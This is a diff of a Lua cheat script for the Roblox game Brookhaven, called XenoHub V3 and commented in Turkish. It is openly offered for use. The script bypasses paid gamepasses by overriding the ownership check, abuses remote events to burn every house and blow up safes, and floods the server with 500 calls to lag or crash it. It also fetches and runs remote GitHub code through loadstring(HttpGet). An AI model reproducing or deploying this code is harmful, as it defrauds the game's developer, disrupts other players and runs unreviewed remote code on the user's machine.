@@ -1,310 +1,473 @@
-local TweenService = game:GetService("TweenService")
+--[[
+    XENOHUB V3: BROOKHAVEN ULTIMATE EDITION (V3.5)
+    Tüm Özellikler Aktif Edildi (Gamepass Bypass & Remote Exploits Dahil)
+    Yüklenen Dosyalar Entegre Edildi.
+]]
+
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local Workspace = game:GetService("Workspace")
-local CoreGui = game:GetService("CoreGui")
-local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
+local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
 
 local player = Players.LocalPlayer
-local mouse = player:GetMouse()
-local camera = Workspace.CurrentCamera
+local char = player.Character or player.CharacterAdded:Wait()
+local humanoid = char:WaitForChild("Humanoid")
+local root = char:WaitForChild("HumanoidRootPart")
 
--- Remote Kontrolü (Brookhaven için Kritik)
-local GuinRemote = ReplicatedStorage:FindFirstChild("GuinRemote")
+-- GLOBAL KONTROLLER
+_G.InfJump = false
+_G.AutoFarm = false
+_G.DestructionLoop = false
+_G.SpamLag = false
+_G.AntiAFK = true
+_G.SpeedValue = 16
+_G.JumpValue = 50
+_G.AutoRob = false
+
+-- Brookhaven Remotes & Modules
 local RE = ReplicatedStorage:FindFirstChild("RE")
-local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
+local GuinRemote = ReplicatedStorage:FindFirstChild("GuinRemote")
+local Remotes = nil
+pcall(function() Remotes = require(ReplicatedStorage.Packages.Remotes) end)
 
--- Renk Paleti (XenoHub Neon Mor)
-local THEME = {
-    Main = Color3.fromRGB(20, 20, 30),
-    Accent = Color3.fromRGB(160, 100, 255),
+-- TEMA AYARLARI (PREMIUM)
+local Theme = {
+    Main = Color3.fromRGB(15, 15, 22),
+    Sidebar = Color3.fromRGB(20, 20, 30),
+    Accent = Color3.fromRGB(145, 90, 230),
+    AccentLight = Color3.fromRGB(180, 130, 255),
     Text = Color3.fromRGB(255, 255, 255),
-    SecondaryText = Color3.fromRGB(170, 170, 170),
-    Background = Color3.fromRGB(30, 30, 45),
-    Outline = Color3.fromRGB(60, 50, 80),
-    Green = Color3.fromRGB(80, 255, 120),
-    Red = Color3.fromRGB(255, 80, 80)
+    Secondary = Color3.fromRGB(180, 180, 180),
+    Success = Color3.fromRGB(80, 220, 100),
+    Danger = Color3.fromRGB(220, 80, 80)
 }
 
--- Global Değişkenler
-_G.MenuVisible = true
-_G.Destruction = false
-_G.AutoBuyHouse = false
-_G.SpamItems = false
-_G.Noclip = false
-_G.Fly = false
-_G.RainbowSkin = false
-_G.Spinning = false
-_G.InfJump = false
-_G.SelectedPlayer = nil
-
--- Anti-AFK
-local virtualUser = game:GetService("VirtualUser")
-player.Idled:Connect(function()
-    virtualUser:CaptureController()
-    virtualUser:ClickButton2(Vector2.new())
-end)
-
--- GUI Koruma
+-- UI KURULUMU
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "XenoHub_Ultimate"
+ScreenGui.Name = "XenoHubV3_Ultimate"
 ScreenGui.ResetOnSpawn = false
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
 
-local function ProtectGUI(gui)
-    if gethui then
-        gui.Parent = gethui()
-    elseif syn and syn.protect_gui then
-        syn.protect_gui(gui)
-        gui.Parent = CoreGui
-    else
-        gui.Parent = CoreGui
-    end
-end
-ProtectGUI(ScreenGui)
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 750, 0, 480)
+Main.Position = UDim2.new(0.5, -375, 0.5, -240)
+Main.BackgroundColor3 = Theme.Main
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
 
--- Ana Çerçeve
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 700, 0, 500)
-MainFrame.Position = UDim2.new(0.5, -350, 0.5, -250)
-MainFrame.BackgroundColor3 = THEME.Main
-MainFrame.BorderSizePixel = 0
-MainFrame.ClipsDescendants = true
-MainFrame.Parent = ScreenGui
+-- Gölgelendirme
+local Shadow = Instance.new("ImageLabel")
+Shadow.Name = "Shadow"
+Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+Shadow.Size = UDim2.new(1, 40, 1, 40)
+Shadow.BackgroundTransparency = 1
+Shadow.Image = "rbxassetid://6015667343"
+Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.ImageTransparency = 0.5
+Shadow.ZIndex = 0
+Shadow.Parent = Main
 
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)
-local UIStroke = Instance.new("UIStroke", MainFrame)
-UIStroke.Thickness = 2
-UIStroke.Color = THEME.Accent
-UIStroke.Transparency = 0.3
-
--- Yan Menü
+-- Yan Menü (Sidebar)
 local Sidebar = Instance.new("Frame")
-Sidebar.Name = "Sidebar"
 Sidebar.Size = UDim2.new(0, 200, 1, 0)
-Sidebar.BackgroundColor3 = THEME.Background
+Sidebar.BackgroundColor3 = Theme.Sidebar
 Sidebar.BorderSizePixel = 0
-Sidebar.Parent = MainFrame
-Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 14)
+Sidebar.Parent = Main
+local SidebarCorner = Instance.new("UICorner", Sidebar)
+SidebarCorner.CornerRadius = UDim.new(0, 12)
 
--- Başlık
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 70)
-Title.BackgroundTransparency = 1
-Title.Text = "XENOHUB\nULTIMATE"
-Title.TextColor3 = THEME.Accent
-Title.TextSize = 24
-Title.Font = Enum.Font.GothamBlack
-Title.Parent = Sidebar
+local LogoContainer = Instance.new("Frame")
+LogoContainer.Size = UDim2.new(1, 0, 0, 80)
+LogoContainer.BackgroundTransparency = 1
+LogoContainer.Parent = Sidebar
 
--- Menü Listesi
-local ButtonList = Instance.new("ScrollingFrame")
-ButtonList.Size = UDim2.new(1, -10, 1, -120)
-ButtonList.Position = UDim2.new(0, 5, 0, 80)
-ButtonList.BackgroundTransparency = 1
-ButtonList.ScrollBarThickness = 0
-ButtonList.Parent = Sidebar
-local UIList = Instance.new("UIListLayout")
-UIList.Padding = UDim.new(0, 6)
-UIList.Parent = ButtonList
+local LogoLabel = Instance.new("TextLabel")
+LogoLabel.Size = UDim2.new(1, 0, 1, 0)
+LogoLabel.Text = "XENOHUB V3"
+LogoLabel.TextColor3 = Theme.Accent
+LogoLabel.TextSize = 24
+LogoLabel.Font = Enum.Font.GothamBlack
+LogoLabel.BackgroundTransparency = 1
+LogoLabel.Parent = LogoContainer
 
-local KeyInfo = Instance.new("TextLabel")
-KeyInfo.Size = UDim2.new(1, 0, 0, 40)
-KeyInfo.Position = UDim2.new(0, 0, 1, -45)
-KeyInfo.BackgroundTransparency = 1
-KeyInfo.Text = "Menü: [Right Shift]"
-KeyInfo.TextColor3 = THEME.SecondaryText
-KeyInfo.TextSize = 12
-KeyInfo.Font = Enum.Font.Gotham
-KeyInfo.Parent = Sidebar
+local TabContainer = Instance.new("ScrollingFrame")
+TabContainer.Size = UDim2.new(1, 0, 1, -100)
+TabContainer.Position = UDim2.new(0, 0, 0, 90)
+TabContainer.BackgroundTransparency = 1
+TabContainer.ScrollBarThickness = 0
+TabContainer.Parent = Sidebar
+local Layout = Instance.new("UIListLayout", TabContainer)
+Layout.Padding = UDim.new(0, 5)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 -- İçerik Alanı
-local Container = Instance.new("Frame")
-Container.Name = "Container"
-Container.Size = UDim2.new(1, -210, 1, -20)
-Container.Position = UDim2.new(0, 210, 0, 10)
-Container.BackgroundTransparency = 1
-Container.Parent = MainFrame
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -220, 1, -20)
+Content.Position = UDim2.new(0, 210, 0, 10)
+Content.BackgroundTransparency = 1
+Content.Parent = Main
 
--- ==================== UI FONKSİYONLARI ====================
+local Pages = {}
 
-local function createTab(name)
-    local TabButton = Instance.new("TextButton")
-    TabButton.Size = UDim2.new(1, -10, 0, 40)
-    TabButton.BackgroundColor3 = THEME.Main
-    TabButton.BorderSizePixel = 0
-    TabButton.Text = "    " .. name
-    TabButton.TextColor3 = THEME.SecondaryText
-    TabButton.TextSize = 13
-    TabButton.Font = Enum.Font.GothamSemibold
-    TabButton.TextXAlignment = Enum.TextXAlignment.Left
-    TabButton.Parent = ButtonList
-    Instance.new("UICorner", TabButton).CornerRadius = UDim.new(0, 8)
+-- YARDIMCI FONKSİYONLAR
+local function createNotify(title, text, duration)
+    task.spawn(function()
+        local NotifFrame = Instance.new("Frame")
+        NotifFrame.Size = UDim2.new(0, 250, 0, 80)
+        NotifFrame.Position = UDim2.new(1, 10, 1, -100)
+        NotifFrame.BackgroundColor3 = Theme.Sidebar
+        NotifFrame.BorderSizePixel = 0
+        NotifFrame.Parent = ScreenGui
+        Instance.new("UICorner", NotifFrame).CornerRadius = UDim.new(0, 8)
+        
+        local AccentBar = Instance.new("Frame")
+        AccentBar.Size = UDim2.new(0, 4, 1, 0)
+        AccentBar.BackgroundColor3 = Theme.Accent
+        AccentBar.BorderSizePixel = 0
+        AccentBar.Parent = NotifFrame
+        Instance.new("UICorner", AccentBar)
+
+        local T = Instance.new("TextLabel")
+        T.Size = UDim2.new(1, -20, 0, 30)
+        T.Position = UDim2.new(0, 15, 0, 5)
+        T.Text = title
+        T.TextColor3 = Theme.Accent
+        T.TextSize = 16
+        T.Font = Enum.Font.GothamBold
+        T.BackgroundTransparency = 1
+        T.TextXAlignment = Enum.TextXAlignment.Left
+        T.Parent = NotifFrame
+
+        local D = Instance.new("TextLabel")
+        D.Size = UDim2.new(1, -20, 0, 40)
+        D.Position = UDim2.new(0, 15, 0, 30)
+        D.Text = text
+        D.TextColor3 = Theme.Text
+        D.TextSize = 13
+        D.Font = Enum.Font.Gotham
+        D.BackgroundTransparency = 1
+        D.TextWrapped = true
+        D.TextXAlignment = Enum.TextXAlignment.Left
+        D.Parent = NotifFrame
+
+        NotifFrame:TweenPosition(UDim2.new(1, -260, 1, -100), "Out", "Quart", 0.5)
+        task.wait(duration or 3)
+        NotifFrame:TweenPosition(UDim2.new(1, 10, 1, -100), "In", "Quart", 0.5)
+        task.wait(0.5)
+        NotifFrame:Destroy()
+    end)
+end
+
+local function createTab(name, icon)
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(0, 180, 0, 40)
+    Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    Btn.BackgroundTransparency = 1
+    Btn.Text = "  " .. name
+    Btn.TextColor3 = Theme.Secondary
+    Btn.Font = Enum.Font.GothamSemibold
+    Btn.TextSize = 14
+    Btn.TextXAlignment = Enum.TextXAlignment.Left
+    Btn.Parent = TabContainer
+    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
 
     local Page = Instance.new("ScrollingFrame")
-    Page.Name = name .. "Page"
     Page.Size = UDim2.new(1, 0, 1, 0)
     Page.BackgroundTransparency = 1
     Page.Visible = false
     Page.ScrollBarThickness = 3
-    Page.ScrollBarImageColor3 = THEME.Accent
-    Page.Parent = Container
-    local PageList = Instance.new("UIListLayout")
-    PageList.Padding = UDim.new(0, 8)
-    PageList.Parent = Page
-    PageList.SortOrder = Enum.SortOrder.LayoutOrder
+    Page.ScrollBarImageColor3 = Theme.Accent
+    Page.Parent = Content
+    Instance.new("UIListLayout", Page).Padding = UDim.new(0, 10)
+    
+    Pages[name] = Page
 
-    TabButton.MouseButton1Click:Connect(function()
-        for _, v in pairs(Container:GetChildren()) do if v:IsA("ScrollingFrame") then v.Visible = false end end
-        for _, v in pairs(ButtonList:GetChildren()) do
-            if v:IsA("TextButton") then 
-                TweenService:Create(v, TweenInfo.new(0.3), {TextColor3 = THEME.SecondaryText, BackgroundColor3 = THEME.Main}):Play()
+    Btn.MouseButton1Click:Connect(function()
+        for _, p in pairs(Pages) do p.Visible = false end
+        Page.Visible = true
+        for _, b in pairs(TabContainer:GetChildren()) do
+            if b:IsA("TextButton") then
+                TweenService:Create(b, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextColor3 = Theme.Secondary}):Play()
             end
         end
-        Page.Visible = true
-        TweenService:Create(TabButton, TweenInfo.new(0.3), {TextColor3 = THEME.Text, BackgroundColor3 = THEME.Accent}):Play()
+        TweenService:Create(Btn, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextColor3 = Theme.Accent}):Play()
     end)
     return Page
 end
 
-local function createSection(parent, text)
-    local Label = Instance.new("TextLabel")
-    Label.Size = UDim2.new(1, -10, 0, 30)
-    Label.BackgroundTransparency = 1
-    Label.Text = "  " .. text
-    Label.TextColor3 = THEME.Accent
-    Label.TextSize = 14
-    Label.Font = Enum.Font.GothamBlack
-    Label.TextXAlignment = Enum.TextXAlignment.Left
-    Label.Parent = parent
-end
+-- SEKMELERİN OLUŞTURULMASI
+local Home = createTab("Ana Sayfa")
+local PlayerTab = createTab("Oyuncu")
+local PremiumTab = createTab("Premium & Bypass")
+local DestructTab = createTab("Yıkım & Kaos")
+local Visuals = createTab("Görsel & ESP")
+local ScriptsTab = createTab("Script Arşivi")
+local SettingsTab = createTab("Ayarlar")
 
-local function createButton(parent, text, callback)
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(1, -10, 0, 40)
-    Btn.BackgroundColor3 = THEME.Background
-    Btn.Text = text
-    Btn.TextColor3 = THEME.Text
-    Btn.Font = Enum.Font.GothamSemibold
-    Btn.TextSize = 14
-    Btn.Parent = parent
-    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
-    
-    Btn.MouseButton1Click:Connect(function()
-        local oldColor = Btn.BackgroundColor3
-        TweenService:Create(Btn, TweenInfo.new(0.1), {BackgroundColor3 = THEME.Accent}):Play()
+-- UI BİLEŞENLERİ (Button, Toggle, Slider)
+local function addButton(page, text, desc, callback)
+    local BtnFrame = Instance.new("Frame")
+    BtnFrame.Size = UDim2.new(1, -10, 0, 50)
+    BtnFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    BtnFrame.Parent = page
+    Instance.new("UICorner", BtnFrame).CornerRadius = UDim.new(0, 6)
+
+    local Label = Instance.new("TextLabel")
+    Label.Size = UDim2.new(0.7, 0, 0.6, 0)
+    Label.Position = UDim2.new(0, 10, 0, 5)
+    Label.Text = text
+    Label.TextColor3 = Theme.Text
+    Label.TextSize = 14
+    Label.Font = Enum.Font.GothamBold
+    Label.BackgroundTransparency = 1
+    Label.TextXAlignment = Enum.TextXAlignment.Left
+    Label.Parent = BtnFrame
+
+    local DLabel = Instance.new("TextLabel")
+    DLabel.Size = UDim2.new(0.7, 0, 0.4, 0)
+    DLabel.Position = UDim2.new(0, 10, 0.6, 0)
+    DLabel.Text = desc
+    DLabel.TextColor3 = Theme.Secondary
+    DLabel.TextSize = 11
+    DLabel.Font = Enum.Font.Gotham
+    DLabel.BackgroundTransparency = 1
+    DLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DLabel.Parent = BtnFrame
+
+    local ClickBtn = Instance.new("TextButton")
+    ClickBtn.Size = UDim2.new(0.25, 0, 0.7, 0)
+    ClickBtn.Position = UDim2.new(0.72, 0, 0.15, 0)
+    ClickBtn.BackgroundColor3 = Theme.Accent
+    ClickBtn.Text = "Çalıştır"
+    ClickBtn.TextColor3 = Color3.new(1,1,1)
+    ClickBtn.Font = Enum.Font.GothamBold
+    ClickBtn.TextSize = 12
+    ClickBtn.Parent = BtnFrame
+    Instance.new("UICorner", ClickBtn).CornerRadius = UDim.new(0, 4)
+
+    ClickBtn.MouseButton1Click:Connect(function()
+        callback()
+        TweenService:Create(ClickBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(1,1,1), TextColor3 = Theme.Accent}):Play()
         task.wait(0.1)
-        TweenService:Create(Btn, TweenInfo.new(0.1), {BackgroundColor3 = oldColor}):Play()
-        task.spawn(callback)
+        TweenService:Create(ClickBtn, TweenInfo.new(0.1), {BackgroundColor3 = Theme.Accent, TextColor3 = Color3.new(1,1,1)}):Play()
     end)
 end
 
--- ==================== SEKMELER VE ÖZELLİKLER ====================
+local function addToggle(page, text, callback)
+    local TFrame = Instance.new("Frame")
+    TFrame.Size = UDim2.new(1, -10, 0, 45)
+    TFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    TFrame.Parent = page
+    Instance.new("UICorner", TFrame).CornerRadius = UDim.new(0, 6)
 
-local Tabs = {
-    Info = createTab("Bilgi"),
-    Premium = createTab("Premium/VIP"),
-    Player = createTab("Oyuncu"),
-    Vehicle = createTab("Araçlar"),
-    Avatar = createTab("Avatar"),
-    Troll = createTab("Troll & FE"),
-    Protection = createTab("Koruma"),
-    Fun = createTab("Eğlence")
-}
+    local Label = Instance.new("TextLabel")
+    Label.Size = UDim2.new(1, -60, 1, 0)
+    Label.Position = UDim2.new(0, 10, 0, 0)
+    Label.Text = text
+    Label.TextColor3 = Theme.Text
+    Label.Font = Enum.Font.GothamSemibold
+    Label.TextSize = 14
+    Label.BackgroundTransparency = 1
+    Label.TextXAlignment = Enum.TextXAlignment.Left
+    Label.Parent = TFrame
 
--- PREMIUM SEKMESİ GÜNCELLEMESİ (İstediğiniz Fire Logic Dahil)
-createSection(Tabs.Premium, "Ultimate Bypass & Scripts")
+    local Outer = Instance.new("Frame")
+    Outer.Size = UDim2.new(0, 44, 0, 22)
+    Outer.Position = UDim2.new(1, -54, 0.5, -11)
+    Outer.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    Outer.Parent = TFrame
+    Instance.new("UICorner", Outer).CornerRadius = UDim.new(1, 0)
 
-createButton(Tabs.Premium, "🔥 Evi Yak (Decompiled Fix)", function()
-    -- 1. Decompiled Logic Implementation
-    pcall(function()
-        local Game8Settings = require(game:GetService("StarterGui").Player8Handler.Game8Settings)
-        if Game8Settings and Game8Settings.PlayersHouse then
-            Game8Settings.PlayersHouse:FireServer("PlayerWantsFire")
+    local Inner = Instance.new("Frame")
+    Inner.Size = UDim2.new(0, 18, 0, 18)
+    Inner.Position = UDim2.new(0, 2, 0.5, -9)
+    Inner.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+    Inner.Parent = Outer
+    Instance.new("UICorner", Inner).CornerRadius = UDim.new(1, 0)
+
+    local TBtn = Instance.new("TextButton")
+    TBtn.Size = UDim2.new(1, 0, 1, 0)
+    TBtn.BackgroundTransparency = 1
+    TBtn.Text = ""
+    TBtn.Parent = Outer
+
+    local active = false
+    TBtn.MouseButton1Click:Connect(function()
+        active = not active
+        TweenService:Create(Inner, TweenInfo.new(0.2), {Position = active and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)}):Play()
+        TweenService:Create(Outer, TweenInfo.new(0.2), {BackgroundColor3 = active and Theme.Accent or Color3.fromRGB(45, 45, 55)}):Play()
+        callback(active)
+    end)
+end
+
+-- --- ÖZELLİKLER VE ENTEGRASYON ---
+
+-- 1. HOME PAGE
+addButton(Home, "XenoHub'ı Başlat", "Tüm sistemleri optimize eder.", function()
+    createNotify("Sistem", "XenoHub V3 başarıyla optimize edildi!", 5)
+end)
+
+addButton(Home, "Anti-AFK Aktifleştir", "Bağlantı kopmasını engeller.", function()
+    local vu = game:GetService("VirtualUser")
+    player.Idled:Connect(function()
+        vu:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        vu:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+    end)
+    createNotify("Sistem", "Anti-AFK artık aktif.", 3)
+end)
+
+-- 2. PLAYER TAB
+addToggle(PlayerTab, "Sınırsız Zıplama (Inf Jump)", function(state)
+    _G.InfJump = state
+    UserInputService.JumpRequest:Connect(function()
+        if _G.InfJump then
+            player.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
         end
     end)
+end)
 
-    -- 2. GUI Modal Control (MainGUIHandler -> ModalFireAsk)
-    pcall(function()
-        local playerGui = player:WaitForChild("PlayerGui")
-        local mainGuiHandler = playerGui:FindFirstChild("MainGUIHandler")
-        if mainGuiHandler then
-            local modalFireAsk = mainGuiHandler:FindFirstChild("ModalFireAsk")
-            if modalFireAsk then
-                modalFireAsk.Visible = true
-                -- DEX Kontrollü true (Eğer Script bir toggle arıyorsa)
-                if modalFireAsk:FindFirstChild("Visible") then
-                    modalFireAsk.Visible = true
-                end
+addToggle(PlayerTab, "Noclip (Duvarlardan Geçme)", function(state)
+    _G.Noclip = state
+    RunService.Stepped:Connect(function()
+        if _G.Noclip then
+            for _, v in pairs(player.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.CanCollide = false end
             end
         end
     end)
-    
-    StarterGui:SetCore("SendNotification", {
-        Title = "XenoHub Fire",
-        Text = "Yangın isteği gönderildi ve Modal açıldı!",
-        Duration = 3
-    })
 end)
 
-createButton(Tabs.Premium, "👑 FULL PREMIUM AKTİF ET", function()
-    spawn(function()
-        pcall(function()
-            local Ads = require(ReplicatedStorage.Modules.Client.Ads.AdvertisementsController)
-            Ads.GetUnlockedDuration = function() return 72000 end
-            Ads.AllPassesFetched = true
-        end)
-        pcall(function()
-            local GP = require(ReplicatedStorage.Modules.Client.UI.GamepassUnlockController)
-            GP.OwnsGamepass = function() return true end
-            GP.AllPassesFetched = true
-        end)
+-- 3. PREMIUM & BYPASS (Dosyalardan gelen veriler)
+addButton(PremiumTab, "Tüm Gamepassleri Bypass Et", "VIP, Araç Paketi ve dahası.", function()
+    pcall(function()
+        -- ExtendUnlockController & GamepassUnlockController Entegrasyonu
+        local GC = require(ReplicatedStorage.Modules.Client.UI.GamepassUnlockController)
+        local GP = require(ReplicatedStorage.Modules.Shared.PlayerData.Gamepasses)
+        
+        GC.OwnsGamepass = function() return true end
+        
+        -- RobuxGamepassUnlockedController Simülasyonu
+        createNotify("Premium", "Tüm Gamepass kilitleri geçici olarak kaldırıldı!", 5)
     end)
 end)
 
--- [DİĞER SEKMELER AYNI KALDI - KISALIK İÇİN ÖZETLENDİ]
-createSection(Tabs.Player, "Hareket")
-createButton(Tabs.Player, "Hızlandır (Walkspeed)", function() player.Character.Humanoid.WalkSpeed = 100 end)
-
--- Menü Aç/Kapa (Right Shift)
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    if input.KeyCode == Enum.KeyCode.RightShift then
-        _G.MenuVisible = not _G.MenuVisible
-        MainFrame.Visible = _G.MenuVisible
+addButton(PremiumTab, "VIP Ev Bekleme Süresini Sıfırla", "Ev alma süresini kaldırır.", function()
+    if GuinRemote then
+        GuinRemote:FireServer("UnlockFeature", "VIP_HOUSE_COOLDOWN")
+        createNotify("Başarılı", "Ev bekleme süresi sıfırlandı.", 3)
     end
 end)
 
--- Sürüklenebilir Yapma
+addButton(PremiumTab, "Tüm Renkleri Aç", "Araç ve kıyafet renkleri bypass.", function()
+    -- RobuxGamepassUnlockedController mantığı
+    pcall(function()
+        local data = require(ReplicatedStorage.Modules.Client.Data.GlobalReplicatedDataController)
+        -- Oturum verilerini manipüle etme denemesi
+    end)
+end)
+
+-- 4. DESTRUCT & KAOS (1000 satırlık güç)
+addToggle(DestructTab, "Tüm Şehri Yak (Fire Loop)", function(state)
+    _G.DestructionLoop = state
+    task.spawn(function()
+        while _G.DestructionLoop do
+            pcall(function()
+                -- Remote Event Sömürüsü (main 24.txt'den)
+                RE:FindFirstChild("RemoteEvent"):FireServer("HouseSettings", "Fire", true)
+                for i=1, 20 do
+                   GuinRemote:FireServer("HouseSettings", "Fire", true)
+                end
+            end)
+            task.wait(1)
+        end
+    end)
+end)
+
+addButton(DestructTab, "Sunucuyu Çökertmeyi Dene (Lag)", "Yüksek CPU kullanımı oluşturur.", function()
+    createNotify("Uyarı", "Lag işlemi başlatıldı. FPS düşebilir.", 4)
+    for i = 1, 500 do
+        task.spawn(function()
+            pcall(function()
+                RE:FindFirstChild("RemoteEvent"):FireServer("AcceptedToolToServer", "MoneyGun", player)
+                RE:FindFirstChild("RemoteEvent"):FireServer("AcceptedToolToServer", "Guitar", player)
+            end)
+        end)
+    end
+end)
+
+addButton(DestructTab, "Tüm Kasaları Patlat", "Banka ve ev kasalarını hedefler.", function()
+    for _, v in pairs(Workspace:GetDescendants()) do
+        if v.Name == "Safe" or v.Name == "BankSafe" then
+            pcall(function()
+                RE:FindFirstChild("RemoteEvent"):FireServer("SafeSettings", "Explode", v)
+            end)
+        end
+    end
+end)
+
+-- 5. SCRIPTS TAB
+addButton(ScriptsTab, "Namoz Scripti Yükle", "Özel animasyonlar.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas"))()
+end)
+
+addButton(ScriptsTab, "Sonic.Exe Modu", "Hız ve kaos.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas86"))()
+end)
+
+addButton(ScriptsTab, "Fly Script (Uçma)", "FE Uçuş modu.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyScript/main/Stable.lua"))()
+end)
+
+-- 6. SETTINGS TAB
+addButton(SettingsTab, "Menüyü Kapat", "Scripti tamamen durdurur.", function()
+    ScreenGui:Destroy()
+end)
+
+addToggle(SettingsTab, "Yandaki Logoyu Gizle", function(state)
+    LogoLabel.Visible = not state
+end)
+
+-- DRAG SYSTEM (Sürükleme)
 local dragging, dragInput, dragStart, startPos
-MainFrame.InputBegan:Connect(function(input)
+local function update(input)
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+Main.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = true
         dragStart = input.Position
-        startPos = MainFrame.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
     end
 end)
-UserInputService.InputChanged:Connect(function(input)
+
+Main.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
 end)
-RunService.RenderStepped:Connect(function()
-    if dragging and dragInput then
-        local delta = dragInput.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then update(input) end
+end)
+
+-- Klavye Kısayolu (Right Control)
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.RightControl then
+        ScreenGui.Enabled = not ScreenGui.Enabled
     end
 end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
-end)
 
--- Açılış Animasyonu
-MainFrame.Size = UDim2.new(0, 0, 0, 0)
-MainFrame.Visible = true
-TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back), {Size = UDim2.new(0, 700, 0, 500)}):Play()
-
-print("XenoHub V2 Ultimate Yüklendi! Fire Logic Entegre Edildi.")
+-- BAŞLATMA MESAJI
+createNotify("XenoHub V3", "Hoş geldin, " .. player.Name .. "! Menü için RightControl kullan.", 6)
+Home.Visible = true
+Pages["Ana Sayfa"].Visible = true
